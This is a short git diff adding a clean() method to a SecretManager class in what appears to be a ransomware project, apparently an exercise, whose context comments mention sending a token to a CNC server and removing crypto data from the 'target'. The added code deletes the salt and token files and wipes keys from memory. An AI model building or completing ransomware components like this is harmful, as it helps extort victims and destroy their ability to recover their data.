@@ -161,6 +161,25 @@ class SecretManager:
         # send file, geniune path and token to the CNC
         raise NotImplemented()
 
-    def clean(self):
-        # remove crypto data from the target
-        raise NotImplemented()
+    def clean(self) -> None:
+        # Remove the local cryptographic files
+        salt_file = os.path.join(self._path, "salt.bin")
+        token_file = os.path.join(self._path, "token.bin")
+
+        try:
+            if os.path.exists(salt_file):
+                os.remove(salt_file)
+                self._log.info("fichier Salt effacé")
+
+            if os.path.exists(token_file):
+                os.remove(token_file)
+                self._log.info("fichier token effacé")
+
+        except Exception as err:
+            self._log.error(f"Erreur lors du 'clean' des fichiers: {err}")
+            raise
+        finally:
+            # Effacer les données en mémoire
+            self._salt = None
+            self._key = None
+            self._token = None
